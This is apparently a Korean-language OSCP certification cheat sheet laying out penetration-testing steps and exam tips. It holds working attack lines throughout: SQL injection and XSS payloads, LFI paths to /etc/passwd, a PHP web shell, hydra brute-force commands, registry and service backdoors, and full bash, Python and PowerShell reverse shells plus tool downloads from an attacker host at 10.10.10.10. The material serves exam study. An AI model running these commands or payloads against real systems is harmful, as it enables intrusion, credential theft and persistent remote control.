<div align="center">
    <img src="https://www.kali.org/images/kali-dragon-icon.svg" alt="Kali Linux 로고" width="150" />
</div>

<div align="center">
    <h1>OSCP 침투 테스트 치트시트</h1>
</div>

> **중요**: 이 문서는 OSCP 시험을 위한 참고용 치트시트입니다. OSCP 시험에서는 다음을 사용할 수 없습니다:
>
> - 스푸핑 (IP, ARP, DNS, NBNS 등)
> - 상용 도구 (Metasploit Pro, Burp Pro 등)
> - 자동화 익스플로잇 도구 (db_autopwn, SQLmap, SQLninja 등)
> - 대규모 취약점 스캐너 (Nessus, OpenVAS 등)
> - AI 챗봇 (OffSec KAI, ChatGPT 등)

### Kali Linux 환경에서 수동 침투 기법 중심으로 작성되었습니다.

# 침투 방법론

## 1. 정보 수집

> **OSCP 팁**: 정보 수집에 충분한 시간을 투자하세요. 대부분의 취약점은 철저한 정보 수집을 통해 발견됩니다.

    - 포트스캔
      - nmap 기본 스캔: nmap -sV -sC <타겟IP> -oN initial_scan
      - 전체 포트 스캔: nmap -sV -sC -p- <타겟IP> -oN full_scan --min-rate 1000
      - UDP 스캔: sudo nmap -sU -sV --top-ports 20 <타겟IP> -oN udp_scan
      - 스크립트 스캔: nmap --script vuln <타겟IP> -oN vuln_scan
        /usr/share/nmap/scripts

    - 서비스 스캔
      - 웹서비스: whatweb <타겟URL>, nikto -host <타겟IP>
      - DNS: dig axfr @<타겟IP> <도메인명>, host -l <도메인명> <타겟IP>
      - SNMP: snmpwalk -v2c -c public <타겟IP>, onesixtyone <타겟IP> public
      - 배너 그래빙: nc <타겟IP> <포트>

    - 웹 애플리케이션 매핑
      - 디렉토리 브루트포싱:
        - gobuster dir -u http://<타겟IP> -w /usr/share/wordlists/dirb/common.txt
        - ffuf -u http://<타겟IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c
        - ffuf 필터링: ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<타겟IP>/FUZZ -fc 403,404

      - HTTP 요청 테스트:
        - curl -X POST -d "param=value" http://<타겟IP>/endpoint
        - curl -i -s -k -X $'GET' -H $'Host: <타겟IP>' -H $'User-Agent: Mozilla/5.0' <URL>

      - 기술 스택 식별: 헤더 분석, 소스 코드 검사, 에러 메시지 분석

    - 워드리스트 활용 (OSCP 추천)
      - 디렉토리 브루트포싱: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
      - 비밀번호 공격: /usr/share/wordlists/rockyou.txt
      - 사용자명: /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
      - 파일 확장자: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt

## 2. 취약점 분석

> **OSCP 팁**: 항상 수동 확인을 우선시하세요. 자동화 도구는 거짓 양성/음성이 많습니다.

    - 수동 취약점 분석 (OSCP 시험 핵심)
      - 서비스 버전 확인 및 알려진 취약점 조사
      - 설정 파일 점검 및 오설정 찾기
      - 소스 코드 검토 (접근 가능한 경우)
      - 인증 메커니즘 테스트

    - 웹 애플리케이션 취약점 분석
      - 수동 SQL 인젝션 테스트: ' OR 1=1 --, admin' --, 등
      - XSS 테스트: <script>alert(1)</script>
      - 파일 업로드:
        - 확장자 변경 우회 (.php -> .php5, .phtml, .php.jpg)
        - Content-Type 변조 (image/jpeg -> application/x-php)
      - 파일 포함 취약점:
        - LFI: curl "http://<타겟IP>/page.php?file=../../../etc/passwd"
        - PHP Filter: curl "http://<타겟IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php"
      - 명령어 삽입: ; id, && whoami, $(id)

    - 네트워크 서비스 취약점
      - SMB 공유 조사:
        - smbclient -L //<타겟IP>/ -N
        - smbclient //<타겟IP>/share -N
        - rpcclient -U "" <타겟IP>
      - NFS:
        - showmount -e <타겟IP>
        - mount -t nfs <타겟IP>:/share /mnt/nfs
      - FTP:
        - anonymous 로그인
        - 설정 파일 검사
      - SSH:
        - 약한 암호화 알고리즘
        - 키 기반 인증 취약점

## 3. 초기 침투 (최초 액세스 확보)

> **OSCP 팁**: 수동 익스플로잇을 작성하는 연습을 하세요. 많은 경우 기존 익스플로잇을 약간 수정해야 작동합니다.

    - 인증 공격
      - 브루트포스 (제한적으로 사용):
        - hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<타겟IP>
        - hydra -L users.txt -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"
      - 기본 자격증명 시도 (admin:admin, admin:password, 등)

    - 수동 웹 취약점 공격
      - SQL 인젝션:
        - 인증 우회: admin' --
        - 데이터 추출: ' UNION SELECT 1,2,3,4,5 --
        - 수동 블라인드: ' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 0,1)='a' --
      - 파일 업로드 + 웹쉘:
        - PHP 웹쉘: <?php system($_GET['cmd']); ?>
        - 업로드 후: curl "http://<타겟IP>/uploads/shell.php?cmd=id"
      - LFI → RCE:
        - 로그 오염 (Log Poisoning)
        - proc/self/environ 악용

    - 수동 익스플로잇 활용
      - searchsploit로 익스플로잇 검색
      - 익스플로잇 코드 검토 및 수정
      - Python/Bash/PowerShell 스크립트 수동 실행

## 4. 권한 상승

> **OSCP 팁**: LinPEAS/WinPEAS는 매우 유용하지만 결과를 항상 수동으로 확인하세요.

    - Windows 권한 상승
      - 패치 누락 확인:
        - systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        - wmic qfe get Caption,Description,HotFixID,InstalledOn
      - 권한 설정 검사:
        - accesschk.exe -uwcqv "Authenticated Users" *
        - icacls "C:\Program Files\*" | findstr "BUILTIN\Users:(F)" /c:"BUILTIN\Users:(M)"
      - 서비스 취약점:
        - Unquoted Service Path
        - 허가된 서비스 파일 교체
      - AlwaysInstallElevated:
        - reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    - Linux 권한 상승
      - 커널 취약점:
        - uname -a (버전 확인)
        - searchsploit linux kernel <버전>
      - SUID 바이너리:
        - find / -perm -u=s -type f 2>/dev/null
      - sudo 권한:
        - sudo -l
      - 취약한 cron 작업:
        - cat /etc/crontab
        - find writable cron scripts
      - 잘못된 파일 권한:
        - find / -writable -type f -not -path "/proc/*" 2>/dev/null

    - 권한 상승 점검 도구 (자동화 + 수동 확인)
      - Linux: LinPEAS, LinEnum
      - Windows: WinPEAS, PowerUp
      - 공통: pspy (프로세스 모니터링)

## 5. 권한 유지 (OSCP 시험에서는 불필요할 수 있음)

    - Windows 지속성
      - 시작 폴더: 실행 파일 추가
      - 레지스트리 Run 키: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\backdoor.exe"
      - 서비스 생성: sc create MyService binPath= "cmd.exe /c C:\backdoor.exe"

    - Linux 지속성
      - cron 작업 등록
      - 시작 스크립트 수정
      - SSH 키 배치: ~/.ssh/authorized_keys

    - 백도어
      - 관리자 계정 생성
      - 웹쉘 설치
      - 리버스 쉘 스크립트 설정

## 6. 측면 이동 (Lateral Movement)

> **OSCP 팁**: 자격 증명 재사용과 로컬 네트워크 스캔은 시험에서 매우 중요합니다.

    - 내부 네트워크 탐색
      - IP 범위 확인: ipconfig/ifconfig, netstat -r
      - 내부 호스트 검색: ping sweep, arp -a
      - 포트 스캔: nmap -sV -p- 10.0.0.1-10 (제한된 범위)

    - 자격 증명 수집 및 재사용
      - Windows 자격 증명: cmdkey /list, saved browsers passwords
      - 설정 파일에서 비밀번호: config.php, wp-config.php, .bash_history
      - 비밀번호 재사용: 발견된 비밀번호로 다른 서비스 접근 시도

    - 원격 액세스
      - PsExec: psexec.py user:password@<타겟IP> cmd
      - WinRM: evil-winrm -i <타겟IP> -u user -p password
      - SSH 키 재사용

## 7. 증거 수집 (OSCP 시험 필수)

> **OSCP 팁**: 모든 플래그를 스크린샷과 함께 저장하고 시스템별로 정리하세요.

    - 플래그 파일 찾기
      - 리눅스: find / -name proof.txt -o -name local.txt 2>/dev/null
      - 윈도우: dir /s /b proof.txt local.txt

    - 스크린샷 증거
      - 관리자/루트 상태에서 whoami 명령어
      - 플래그 파일과 함께 hostname/IP 표시
      - 취약점 증명 과정 캡처

    - 시스템 정보 수집
      - 사용자 목록
      - 네트워크 구성
      - 중요 파일 및 디렉터리 권한

## 8. 정리 (OSCP 시험에서는 불필요)

    - 사용한 도구 제거
    - 생성한 파일 삭제
    - 로그 정리
    - 추가한 계정 삭제

# OSCP 시험 특화 팁

## 시간 관리

    - 25점 짜리 Active Directory 문제부터 시작하세요
    - 점수 계산을 항상 염두에 두고 문제를 선택하세요
    - 한 시스템에 2-3시간 이상 소요되면 다른 시스템으로 전환하세요
    - 휴식 시간을 반드시 가지세요 (최소한 6-8시간 수면)

## 문서화

    - 실시간으로 문서화하세요 (스크린샷, 명령어, 출력 결과)
    - 각 시스템별로 별도 문서 유지
    - 시도한 방법과 결과를 모두 기록 (실패한 것도 포함)
    - 플래그와 증거 스크린샷은 즉시 저장

## 문제 해결 전략

    - 열린 포트에서 실행 중인 모든 서비스 확인
    - 발견된 모든 사용자 이름/비밀번호 목록 유지
    - Windows에서는 SeImpersonatePrivilege 권한 확인 (PrintSpoofer/JuicyPotato)
    - 리버스 쉘이 작동하지 않으면 바인드 쉘 시도
    - 외부 도구가 필요하면 SimpleHTTPServer로 전송

## OSCP 허용 도구 모음

    - 정보 수집: nmap, nikto, gobuster, ffuf, enum4linux
    - 웹 애플리케이션: Burp Suite Community, OWASP ZAP
    - 익스플로잇: searchsploit, Metasploit(제한적)
    - 권한 상승: LinPEAS, WinPEAS, PowerUp, pspy
    - 비밀번호 공격: hydra, hashcat, John the Ripper

## Metasploit 제한 사항

    - OSCP 시험에서는 Metasploit/Meterpreter를 **단 하나의 시스템**에만 사용할 수 있습니다.
    - Metasploit 사용을 최대한 피하고, 수동 익스플로잇을 연습하세요.
    - Multi/Handler는 제한 없이 사용 가능합니다.

## 워드리스트 선택 가이드

    - 디렉토리 브루트포싱:
      - 기본: /usr/share/wordlists/dirb/common.txt
      - 대규모: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

    - 비밀번호 크래킹:
      - 주력: /usr/share/wordlists/rockyou.txt

    - 사용자명:
      - /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
      - /usr/share/seclists/Usernames/Names/names.txt

## 유용한 명령어 모음

    - 리버스 쉘:
      ```bash
      # Bash
      bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'

      # Python
      python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

      # PowerShell
      powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
      ```

    - 업그레이드된 쉘:
      ```bash
      python -c 'import pty; pty.spawn("/bin/bash")'
      export TERM=xterm
      Ctrl+Z [background]
      stty raw -echo; fg
      reset
      ```

    - 파일 전송:
      ```bash
      # 공격자 측
      python3 -m http.server 8000

      # 대상 측 (Linux)
      wget http://10.10.10.10:8000/linpeas.sh
      curl -O http://10.10.10.10:8000/linpeas.sh

      # 대상 측 (Windows)
      certutil -urlcache -f http://10.10.10.10:8000/winpeas.exe winpeas.exe
      Invoke-WebRequest "http://10.10.10.10:8000/winpeas.exe" -OutFile "winpeas.exe"
      ```

## 문제 발생 시 확인사항

    - VPN 연결이 안정적인지 확인
    - 핵심 정보를 놓치지 않았는지 처음부터 다시 검토
    - 실패한 방법을 계속 시도하기보다 새로운 접근법 시도
    - 시험 중 기술적 문제가 발생하면 즉시 지원팀에 연락

# 마지막 체크리스트

    - 모든 시스템 점수 계산 (70점 이상 필요)
    - 모든 플래그와 증거가 적절히 문서화됨
    - 보고서에 사용할 스크린샷이 충분히 준비됨
    - 각 문제 해결 과정이 단계별로 문서화됨
    - 보고서 작성을 위한 템플릿이 준비됨
